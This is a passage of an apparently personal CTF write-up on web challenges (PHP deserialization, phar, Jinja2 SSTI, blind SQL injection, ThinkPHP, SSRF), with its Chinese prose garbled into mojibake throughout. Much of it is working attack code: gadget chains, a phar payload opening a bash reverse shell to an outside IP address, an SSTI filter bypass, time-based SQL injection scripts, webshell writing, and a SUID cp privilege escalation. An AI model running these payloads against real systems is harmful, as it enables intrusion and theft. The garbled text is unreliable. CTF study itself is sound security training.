router;\n```\n\næ¯”è¾ƒå…³é”®çš„å°±æ˜¯è¿™ä¸¤ä¸ªæ–‡ä»¶å†…å®¹\n\nç®€å•å®¡è®¡ä¸€ä¸‹\n\nå®ƒä¼šå°†æˆ‘ä»¬æäº¤çš„å†…å®¹å±•ç¤ºå‡ºæ¥ \n\nå¹¶ä¸”ä¼šç»è¿‡mergeä¸€ä¸ªåˆå¹¶å‡½æ•° ç†Ÿäººäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166758715-338c47b1-47e3-4ac6-9785-be333a06fc3c.png)\n\nå†…å®¹åŒ…æ‹¬`data,place,contact,reason,timestamp(æ—¶é—´æˆ³)`\n\né‚£ä¹ˆåœ¨è¿™é‡Œéœ€è¦æ±¡æŸ“çš„ç‚¹æ˜¯ä»€ä¹ˆå‘¢ \n\nå…¶å®åœ¨è¿™é‡Œç»™äº†æç¤º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166888157-91644cb2-2103-49b6-b72c-2175670971f3.png)\n\n```\n// Remove test data from before the movie was released\n```\n\n`â€œä»–ä¼šåˆ é™¤ç”µå½±ä¸Šæ˜ å‰çš„æ•°æ®â€` ä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•°æ®åœ¨ä¹‹å‰çš„æ—¶é—´é‡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167165409-d0be8833-d256-44c9-a712-ad8cedc046cd.png)\n\nå†çœ‹ä¸Šé¢`||`æ¡ä»¶è¯­å¥ å­˜åœ¨ä¸€ä¸ªçŸ­è·¯ é»˜è®¤min_public_timeæ˜¯2019-07-09\n\nCONFIG.min_public_timeé»˜è®¤æ˜¯æ— çš„ ä¸å­˜åœ¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697274880739-9d9bc3d7-e83f-43d7-a46c-452764c272a1.png)\n\nå¦‚æœ`CONFIG.min_public_time`æœ‰å€¼é‚£ä¹ˆçŸ­è·¯å°±ä¸ä¼š`new default min_public_time`çš„å€¼\n\né‚£ä¹ˆå°±éœ€è¦åŸå‹é“¾æ±¡æŸ“å»ä¿®æ”¹è¿™ä¸ª`CONFIG.min_public_time`\n\n`min_public_time`åœ¨config.defaultæ–‡ä»¶ ç„¶åè¢«å¼•å…¥çš„ æ ¼å¼æ˜¯è¿™æ ·çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167312141-c99bbfb6-154d-4920-aad1-2d15c7586b7a.png)\n\nåªéœ€è¦å°†è¿™ä¸ªæ—¶é—´æ”¹æ¯”å®ƒé»˜è®¤å€¼å°å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167358763-2fd909df-fef3-4b62-bb20-85c359e4dfd3.png)\n\nä¸ºä»€ä¹ˆå‘¢ å› ä¸ºæˆ‘ä»¬ä¹‹å‰æäº¤æ•°æ®çš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªæ—¶é—´æˆ³ è¿™ä¸ªæœ€å°æ—¶é—´æˆ³çš„ç”Ÿæˆæ˜¯ç”±è¿™ä¸ª`CONFIG.min_public_time`å½±å“çš„\n\n```\nlet minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();\ntimestamp = Math.max(timestamp, minTimestamp);\n```\n\næ‰€ä»¥ä¿®æ”¹`CONFIG.min_public_time`å°±ä¼šä¿®æ”¹æœ€æ€»æ—¶é—´æˆ³ ä½¿å…¶å›åˆ°ä¹‹å‰çš„æ—¶é—´å°±èƒ½å°†ä¹‹å‰çš„æ•°æ®è¯»å‡ºæ¥\n\nç„¶åæ ¹æ®ä»£ç é€»è¾‘ è®¿é—®`/info/ä¸€ä¸ªå°å€¼` å†…å®¹å°±è¢«æ‰“å°å‡ºæ¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167409474-8c8f8358-af0f-44f2-8d83-ce6749dde650.png)\n\n# WEEK4\n\n## More Fast\n\nè€ƒç‚¹ï¼š\n\n- fast destruct\n\nexp\n\n```javascript\n<?php\nclass Start{\n    public $errMsg;\n}\n\nclass Pwn{\n    public $obj;\n}\n\nclass Reverse{\n    public $func;\n\n}\n\nclass Web{\n    public $func;\n    public $var;\n}\n\nclass Crypto{\n    public $obj;\n\n}\n\nclass Misc{\n}\n$a = new Start();\n$a->errMsg = new Crypto();\n$a->errMsg->obj = new Reverse();\n$a->errMsg->obj->func = new Pwn();\n$a->errMsg->obj->func->obj = new Web();\n$a->errMsg->obj->func->obj->var = \"cat /f*\";\n$a->errMsg->obj->func->obj->func = \"system\";\necho serialize($a);\n#O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}\n```\n\n## é€ƒ\n\nä¸€çœ¼ä¸çœŸ é‰´å®šä¸ºååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\n\nè€ƒç‚¹ï¼š\n\n- ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\n\nä»bad->goodä¼šå¤šå‡ºä¸€ä¸ªå­—ç¬¦ é‚£ä¹ˆç»è¿‡åºåˆ—åŒ–->waf->ååºåˆ—åŒ–å°±ä¼šæœ‰ä¸€ä¸ªå­—ç¬¦é€ƒé€¸å‡ºæ¥\n\nä¸¾ä¾‹æ‰§è¡Œwhoami \n\nå°†è¿™ä¸€ä¸²å¡å…¥`\";s:3:\"cmd\";s:6:\"whoami\";}`é‚£ä¹ˆå°±éœ€è¦26ä¸ªå­—ç¬¦é€ƒé€¸å‡ºæ¥ é‚£ä¹ˆå°±éœ€è¦26ä¸ªbad\n\npaylaodï¼š`badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:6:\"whoami\";}`\n\nå…¶ä»–å‘½ä»¤æ ¹æ®å­—ç¬¦ä¸ªæ•°æ”¹ç›¸åº”çš„badä¸ªæ•°è°ƒæ•´å³å¯\n\npayloadï¼š`?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";}`\n\n## flask disk\n\nè¿™é“é¢˜æˆ‘åº”è¯¥æ˜¯éé¢„æœŸäº†\n\næˆ‘çš„åšæ³•æ˜¯ ç›´æ¥ä¸Šä¼ app.py å†…å®¹ç›´æ¥æ˜¯pythonå‘½ä»¤æ‰§è¡Œåå¼¹shell \n\nè¿™æ ·ä¼šè¦†ç›–é¢˜ç›®çš„app.py ç›´æ¥æ‹¿ä¸‹\n\nçŸ¥è¯†ç‚¹ï¼š`flaskå¼€å¯äº†debugæ¨¡å¼ä¸‹ï¼Œapp.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ã€‚  `\n\n## PharOne\n\nè¿™é“é¢˜å¤ªå¯æƒœäº†\n\nä¸€çœ¼ä¸çœŸå°±æ˜¯pharååºåˆ—åŒ–åˆ©ç”¨\n\nå½“æ—¶ç”±äºè‡ªå·±å¼€äº†vpn å¯¼è‡´åå¼¹shellä¸€ç›´è¿‡ä¸æ¥  é”™å¤±è‰¯æœº\n\nè€ƒç‚¹ï¼š\n\n- pharååºåˆ—åŒ–\n\né¦–å…ˆç»™äº†æ¶æ„ç±»\n\n```javascript\n<?php\nhighlight_file(__FILE__);\nclass Flag{\n    public $cmd;\n    public function __destruct()\n    {\n        @exec($this->cmd);\n    }\n}\n@unlink($_POST['file']);\n```\n\nå…ˆç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶\n\n```javascript\n<?php\nclass Flag{\n    public $cmd;\n    public function __destruct()\n    {\n        @exec($this->cmd);\n    }\n}\n$a = new Flag();\n$a->cmd = 'bash -c \"bash -i >& /dev/tcp/8.130.34.53/7777 0>&1\"';\n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$phar->setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering(); \n?>\n```\n\nä¸Šä¼ ä¸Šå»ä¹‹åæ˜¾ç¤ºè¿‡æ»¤äº†__HALT_COMPILER\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642632042-0e857bfb-849f-4ca9-96eb-8ab35051a90b.png)\n\nå¯ä»¥é€šè¿‡gzipå‹ç¼©ç»•è¿‡ æ¥è‡ªï¼š[php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿](https://pankas.top/2022/08/04/php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿/)![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642675212-31124284-5660-49f3-8ded-02d920345766.png)\n\nç„¶åè¿˜ä¼šæ£€æµ‹ä¸Šä¼ æ–‡ä»¶åç¼€åä»¥åŠmine \n\nå½“ç„¶pharæ–‡ä»¶åç¼€åæ˜¯æ— å…³ç´§è¦çš„ ä¸æ˜¯`.phar`ç…§æ ·èƒ½è§£æ\n\næ‰€ä»¥å°†æ‰“åŒ…çš„å‹ç¼©åŒ…æ”¹ä¸ºä»»æ„åç¼€åéƒ½è¡Œ\n\nç„¶åæ³¨æ„è¿™é‡Œ`phar://`åè®®è¦åˆ°`Z1d10t.phar`\n\nä¸Šä¼ ä¸Šå»ä¹‹å`file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg/Z1d10t.phar`\n\nè®°å¾—å…³vpn å“­æ­»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642947630-648bd479-d31a-42a1-a3db-e854baf8d485.png)\n\n## InjectMe\n\nè€ƒç‚¹:\n\n- jinja2 ssti\n\né¦–å…ˆæ˜¯ä»»æ„æ–‡ä»¶è¯»å–\n\n```\n/download?file=/app/app.py\n```\n\nè·å¾—æºç ï¼š\n\n```javascript\nimport os\nimport re\n\nfrom flask import Flask, render_template, request, abort, send_file, session, render_template_string\nfrom config import secret_key\n\napp = Flask(__name__)\napp.secret_key = secret_key\n\n\n@app.route('/')\ndef hello_world():  # put application's code here\n    return render_template('index.html')\n\n\n@app.route(\"/cancanneed\", methods=[\"GET\"])\ndef cancanneed():\n    all_filename = os.listdir('./static/img/')\n    filename = request.args.get('file', '')\n    if filename:\n        return render_template('img.html', filename=filename, all_filename=all_filename)\n    else:\n        return f\"{str(os.listdir('./static/img/'))} <br> <a href=\\\"/cancanneed?file=1.jpg\\\">/cancanneed?file=1.jpg</a>\"\n\n\n@app.route(\"/download\", methods=[\"GET\"])\ndef download():\n    filename = request.args.get('file', '')\n    if filename:\n        filename = filename.replace('../', '')\n        filename = os.path.join('static/img/', filename)\n        print(filename)\n        if (os.path.exists(filename)) and (\"start\" not in filename):\n            return send_file(filename)\n        else:\n            abort(500)\n    else:\n        abort(404)\n\n\n@app.route('/backdoor', methods=[\"GET\"])\ndef backdoor():\n    try:\n        print(session.get(\"user\"))\n        if session.get(\"user\") is None:\n            session['user'] = \"guest\"\n        name = session.get(\"user\")\n        if re.findall(\n                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.',\n                name):\n            abort(500)\n        else:\n            return render_template_string(\n                'ç«Ÿç„¶ç»™<h1>%s</h1>ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ <br> é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!<br> æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜' % name)\n    except Exception:\n        abort(500)\n\n\n@app.errorhandler(404)\ndef page_not_find(e):\n    return render_template('404.html'), 404\n\n\n@app.errorhandler(500)\ndef internal_server_error(e):\n    return render_template('500.html'), 500\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=8080)\n```\n\nå‘ç°`/backdoor` å¯ä»¥è¿›è¡Œssti ä½†æ˜¯å…ˆè·å–key\n\næŸ¥çœ‹æºç  å¯ä»¥å‘ç°secretæ˜¯ç”±configå¼•è¿›æ¥çš„\n\n```\nfrom config import secret_key\n```\n\nè¯»å–key`/download?file=/app/config.py`è·å¾—`secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\"`\n\næœ€éš¾ç»·çš„å°±æ˜¯è¿™ä¸ªsessioné‡Œé¢è¿›è¡Œssti payloadä¸€å¤šå°±ä¼šçˆ†500é”™çœŸçš„è®©äººéš¾ç»·\n\nèƒ½ä¸èƒ½å¯¹sessionçš„è·å–åŠ ä¸ªbase64ç¼–è§£ç ã€‚ã€‚ã€‚ çœŸçš„ä¼šæ–¹ä¾¿å¾ˆå¤š \n\nè¿˜æœ‰sessionä¼ªé€ çš„æ—¶å€™è½¬ä¹‰ã€‚ã€‚ã€‚ã€‚ç¼–ä¸ªç å§\n\npayloadï¼š`{% print(config['_''_cl''ass_''_']['_''_in''it_''_']['_''_glo''bals_''_']['o''s']['pop''en']('head /y0*')['read']()) %}\"}'`\n\n## midsql\n\nè€ƒç‚¹:\n\n- sqlæ—¶é—´ç›²æ³¨\n\nè¿™ä¸ªé¢˜ç›®æ‰¾åˆ°è‡ªå·±ç¼ºæ¼çš„åœ°æ–¹äº† æ²¡å’‹å¥½å¥½åšè¿‡æ—¶é—´ç›²æ³¨\n\nå¯¼è‡´è‡ªå·±å†™çš„è„šæœ¬æ³¨èµ·æ¥å¤ªæ…¢äº†\n\n```javascript\nimport requests\nimport time\nurl = 'http://fef1d48c-1c22-46b2-aba3-0d22fafc8c10.node4.buuoj.cn:81'\nresult=''\nfor i in range(1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        paylaod = \"1/**/And/**/if(ascii(substr((select/**/group_Concat(name)/**/from/**/ctf.items),{},1))/**/>/**/{},sleep(5),0)%23\".format(i,mid)\n        #çˆ†åº“ï¼š1/**/And/**/if(ascii(substr(database(),{},1))/**/>/**/{},sleep(5),0)%23\n        #æŠ¥è¡¨ï¼š1/**/And/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'ctf'),{},1))/**/>/**/{},sleep(5),0)%23\n        #çˆ†åˆ—ï¼š1/**/And/**/if(ascii(Substr((Select(group_Concat(column_name))from(Information_schema.columns)Where(table_name/**/like/**/'items')),{},1))/**/>/**/{},sleep(4),0)%23\n        #çˆ†æ•°æ®ï¼š\n        timestart = time.time()\n        r = requests.get(url+\"?id=\"+paylaod)\n        timeend = time.time()\n        if (timeend - timestart >= 3):\n            low = mid+1\n            mid = (low+high)//2\n        else:\n            high = mid-1\n            mid = (low+high)//2\n    result+=chr(high+1)\n    print(result)\n```\n\né€šè¿‡æ—¶é—´å·®å€¼æ¥åˆ¤æ–­æœ‰æ—¶å€™ä¼šä¸å‡† \n\næœ€å¥½é€šè¿‡æ•è·å¼‚å¸¸çš„æ–¹å¼è¿›è¡Œåˆ¤æ–­ä¼šæ›´å‡†\n\næ›´å¥½çš„æ–¹å¼:\n\n```javascript\nimport requests\nfrom tqdm import trange\nres = ''\nlast = ' '\nheaders = {\n    'Host': '32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81',\n    'Cache-Control': 'max-age=0',\n    'Upgrade-Insecure-Requests': '1',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',\n    'Referer': 'http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/',\n    'Accept-Encoding': 'gzip, deflate',\n    'Accept-Language': 'zh-CN,zh;q=0.9'\n}\nfor i in trange(1, 1000):\n    for j in range(127, 31, -1):\n        url = r'http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/?id='\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{i},1))>{j}),sleep(3),0)' # information_schema,mysql,performance_schema,sys,test,ctf\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/database()),{i},1))>{j}),sleep(3),0)'\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/\"ctf\"),{i},1))>{j}),sleep(3),0)'\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/\"items\"),{i},1))>{j}),sleep(3),0)' # id,name,price\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        # payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        payload = rf'1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        url = url + payload\n        # print(url)\n        try:\n            response = requests.get(url=url, timeout=3)\n        except Exception as e:\n            last = res\n            # print(chr(j+1))\n            res += chr(j+1)\n            # print(res)\n            break\n    print('[*] ' + res)\n```\n\n## OtenkiBoyï¼ˆæœªè§£å‡ºï¼‰\n\nä¸å¤ªä¼š ä¸æƒ³ä»£ç å®¡è®¡äº†qwq\n\n# WEEK5\n\n## Unserialize Again\n\nè€ƒç‚¹ï¼š\n\n- pharååºåˆ—åŒ–\n- pharé‡ç­¾å\n\næºç å¦‚ä¸‹ï¼š\n\n```javascript\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);  \nclass story{\n    private $user='admin';\n    public $pass;\n    public $eating;\n    public $God='false';\n    public function __wakeup(){\n        $this->user='human';\n        if(1==1){\n            die();\n        }\n        if(1!=1){\n            echo $fffflag;\n        }\n    }\n    public function __construct(){\n        $this->user='AshenOne';\n        $this->eating='fire';\n        die();\n    }\n    public function __tostring(){\n        return $this->user.$this->pass;\n    }\n    public function __invoke(){\n        if($this->user=='admin'&&$this->pass=='admin'){\n            echo $nothing;\n        }\n    }\n    public function __destruct(){\n        if($this->God=='true'&&$this->user=='admin'){\n            system($this->eating);\n        }\n        else{\n            die('Get Out!');\n        }\n    }\n}                 \nif(isset($_GET['pear'])&&isset($_GET['apple'])){\n    // $Eden=new story();\n    $pear=$_GET['pear'];\n    $Adam=$_GET['apple'];\n    $file=file_get_contents('php://input');\n    file_put_contents($pear,urldecode($file));\n    file_exists($Adam);\n}\nelse{\n    echo 'å¤šåƒé›ªæ¢¨';\n} \n```\n\n### éé¢„æœŸ\n\néé¢„æœŸäº†\n\nç”±äºæ²¡æœ‰æ§åˆ¶è·¯å¾„\n\nç›´æ¥å†™é©¬åˆ°ç½‘ç«™æ ¹ç›®å½•å°±è¡Œäº†\n\n```javascript\n/pairing.php?pear=/var/www/html/a.php&apple=1\nx=system('cat /flllag');\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988088416-7cd82ab6-f545-4824-8ccf-6e9813e9255a.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988099715-8340a7be-7dd9-4926-9ba8-a0a6b2ab7fb6.png)\n\nä¹‹åçœ‹çœ‹é¢„æœŸè§£å­¦ä¹ \n\n### é¢„æœŸè§£\n\nçœ‹äº†å®˜æ–¹æ–‡æ¡£é¢„æœŸè§£æ¥äº†\n\nè€ƒå¯Ÿçš„pharé‡ç­¾åçš„çŸ¥è¯†ç‚¹\n\né¦–å…ˆæ¶æ„ç±»åˆ©ç”¨å¾ˆç®€å• åªéœ€è¦`__wakeupå’Œ__destruct`å³å¯\n\n```javascript\n<?php\nclass story{\n    public $eating = 'cat /f*';\n    public $God='true';\n}\n$phar = new Phar(\"Z1d10t.phar\");\n$phar->startBuffering();\n$phar->setStub(\"<php __HALT_COMPILER(); ?>\");\n$o = new story();\n$phar->setMetadata($o);\n$phar->addFromString(\"test.txt\", \"test\");\n$phar->stopBuffering();\n```\n\n`__wakeup`é€šè¿‡ä¿®æ”¹ç±»å±æ€§ä¸ªæ•°ç»•è¿‡å³å¯ è¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ªpharé‡ç­¾åçš„é—®é¢˜\n\nå› ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadæ˜¯åœ¨pharæ–‡ä»¶ä¸­ ç”Ÿæˆpharä¹‹åä¿®æ”¹ç±»å±æ€§ä¸ªæ•°\n\næŒ‰ç…§å®˜æ–¹WP\n\n> pharçš„æœ€åæœ‰ä¸€æ®µsignatureï¼Œæ˜¯pharçš„ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œè¦æ³¨æ„å› ä¸ºæˆ‘ä»¬ä¿®æ”¹äº†æ–‡ä»¶çš„å†…å®¹ï¼Œä¹‹å‰çš„ç­¾åå°±ä¼šæ— æ•ˆï¼Œæ‰€ä»¥éœ€è¦æ›´æ¢ä¸€ä¸ªæ–°çš„ç­¾å\n\nä¿®æ”¹ç­¾åè„šæœ¬å¦‚ä¸‹ï¼š\n\n```javascript\nfrom hashlib import sha1\nwith open('Z1d10t.phar', 'rb') as file:\n    f = file.read()\ns = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®\nh = f[-8:] # è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯†\nnewf = s + sha1(s).digest() + h # æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)\nwith open('ChangedPhar.phar', 'wb') as file:\n    file.write(newf) # å†™å…¥æ–°æ–‡ä»¶\n```\n\nç„¶åå°†ä¿®æ”¹ç­¾ååçš„æ–‡ä»¶å†…å®¹è¯»å‡ºæ¥urlç¼–ç ä¹‹åé€šè¿‡postä¼ è¿›å» \n\nå†é€šè¿‡`phar://`åè®®è¯»å–å³å¯æˆåŠŸrce \n\nä½†æ˜¯æˆ‘æ²¡å¤ç°æˆåŠŸ  æˆ‘åå¼¹shellå»çœ‹ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ä¹Ÿæ²¡é”™ ä½†æ˜¯å°±æ˜¯ä¸å¾—è§£ ä¸çŸ¥é“ä»€ä¹ˆåŸå› \n\nç”¨å®˜æ–¹WPä¸­çš„è„šæœ¬ ä¹Ÿä¸æˆåŠŸ\n\n## Final\n\næŠ¥é”™å‘ç°æ˜¯thinkphp5.0.23 é‚£ä¹ˆå¯ä»¥ç›´æ¥æ ¹æ®ç‰ˆæœ¬å»æ‰¾æ¼æ´åˆ©ç”¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698479533782-f7d4c9e8-4bd6-4a96-b468-7e9225580e39.png)\n\nè¿™é‡Œå½“æ—¶ä¸ºäº†æŠ¢ä¸€è¡€ç›´æ¥ç”¨å·¥å…·æ¢­å“ˆäº†\n\nå†™é©¬åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ å‘ç°ç¦äº†system é‚£ä¹ˆæˆ‘ä»¬ç”¨passthruæˆ–è€…execç­‰æ— å›æ˜¾å‡½æ•°éƒ½å¯ä»¥ åæ­£æˆ‘ä»¬è¦è¿›è¡Œåå¼¹shell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481376316-6c17aacc-a517-4047-95f5-cd46b8a6a792.png)\n\nè®°å¾—payloadè¦urlç¼–ç ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481525990-8c6fad3d-f5c8-4968-afa3-4cfa7cf6d689.png)\n\nå‘ç°æƒé™ä¸å¤Ÿ æ¶‰åŠææƒ é‚£ä¸€èˆ¬æ˜¯è€ƒå¯Ÿsuidææƒ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481570952-e9ed3e3d-a994-4707-97f2-5fe5a50e12cf.png)\n\nçœ‹çœ‹å“ªäº›å‘½ä»¤æœ‰suid\n\næœ‰cp å‘¢é“å®šæ˜¯cpææƒäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481643850-8aaf3276-06d0-4874-83c3-864ea8233ae4.png)\n\nç›´æ¥æŠŠå†…å®¹å¤åˆ¶åˆ°/etc/passwd ç„¶åæ‹¿flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481704911-05884a79-1873-4441-b306-6615bb8d8e1c.png)\n\n## pppython?\n\nè¿™é“é¢˜ç›®åº”è¯¥å€Ÿé‰´çš„æ˜¯SCTF2023çš„`pypypï¼Ÿ`\n\nè€ƒç‚¹ï¼š\n\n- ssrf\n- flask pinç è®¡ç®—\n- gopheråè®®\n\nåšè¿™é“é¢˜ç›®ä¹‹å‰åº†å¹¸å­¦ä¹ äº†0xgame2023ä¸€é“ssrfæ‰“redisä¸»ä»å¤åˆ¶é¢˜ç›®\n\nå­¦ä¹ Aecouså¸ˆå‚…çš„çš„WP:) å¸ˆå‚…å¤ªå¼ºåŠ›ORZ\n\næºç å¦‚ä¸‹ï¼š\n\n```javascript\n<?php\n    \n    if ($_REQUEST['hint'] == [\"your?\", \"mine!\", \"hint!!\"]){\n        header(\"Content-type: text/plain\");\n        system(\"ls / -la\");\n        exit();\n    }\n    \n    try {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']);\n        $output = curl_exec($ch);\n        echo $output;\n        curl_close($ch);   \n    }catch (Error $x){\n        highlight_file(__FILE__);\n        highlight_string($x->getMessage());\n    }\n\n?> \n```\n\né¦–å…ˆæ ¹æ®é¢˜ç›®è·å–æç¤º\n\n```\n?hint[]=your%3F&hint[]=mine!&hint[]=hint!!\n```\n\næ‹¿åˆ°äº†/ç›®å½•ä¸‹çš„æ–‡ä»¶æƒ…å†µ\n\nå¯ä»¥é†’ç›®çš„å‘ç°app.py\n\n```javascript\ntotal 12\ndrwxr-xr-x    1 root root  51 Oct 22 15:23 .\ndrwxr-xr-x    1 root root  51 Oct 22 15:23 ..\n-rwxr-xr-x    1 root root   0 Oct 22 15:23 .dockerenv\n-rwxr-xr-x    1 root root 353 Oct 19 15:52 app.py\nlrwxrwxrwx    1 root root   7 Nov 22  2021 bin -> usr/bin\ndrwxr-xr-x    2 root root   6 Nov  8  2021 boot\ndrwxr-xr-x    5 root root 360 Oct 22 15:23 dev\ndrwxr-xr-x    1 root root  66 Oct 22 15:23 etc\n-rw-------    1 root root  43 Oct 22 15:23 flag\ndrwxr-xr-x    2 root root   6 Nov  8  2021 home\nlrwxrwxrwx    1 root root   7 Nov 22  2021 lib -> usr/lib\nlrwxrwxrwx    1 root root   9 Nov 22  2021 lib32 -> usr/lib32\nlrwxrwxrwx    1 root root   9 Nov 22  2021 lib64 -> usr/lib64\nlrwxrwxrwx    1 root root  10 Nov 22  2021 libx32 -> usr/libx32\ndrwxr-xr-x    2 root root   6 Nov 22  2021 media\ndrwxr-xr-x    2 root root   6 Nov 22  2021 mnt\ndrwxr-xr-x    2 root root   6 Nov 22  2021 opt\ndr-xr-xr-x 3110 root root   0 Oct 22 15:23 proc\ndrwx------    1 root root  20 Oct 19 15:52 root\ndrwxr-xr-x    1 root root  21 Oct 19 15:50 run\nlrwxrwxrwx    1 root root   8 Nov 22  2021 sbin -> usr/sbin\ndrwxr-xr-x    2 root root   6 Nov 22  2021 srv\n-rwx------    1 root root 241 Oct 19 15:52 start.sh\ndr-xr-xr-x   13 root root   0 Sep 19 01:23 sys\ndrwxrwxrwt    1 root root   6 Oct 22 15:23 tmp\ndrwxr-xr-x    1 root root  19 Nov 22  2021 usr\ndrwxr-xr-x    1 root root  17 Oct 19 15:49 var\n```\n\né‚£ä¹ˆé€šè¿‡fileä¼ªåè®®å»è¯»å–æ–‡ä»¶`?url=file://127.0.0.1/app.py&lolita[]=1`\n\napp.py\n\n```javascript\nfrom flask import Flask, request, session, render_template, render_template_string\nimport os, base64\n#from NeepuF1Le import neepu_files\n\napp = Flask(__name__)\n\napp.config['SECRET_KEY'] = '******'\n@app.route('/')\ndef welcome():\n    if session[\"islogin\"] == True:\n        return \"flag{***********************}\"\n\n    \n\n\napp.run('0.0.0.0', 1314, debug=True)1\n```\n\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¦ä¹ˆèƒ½è·å–keyä¼ªé€ session 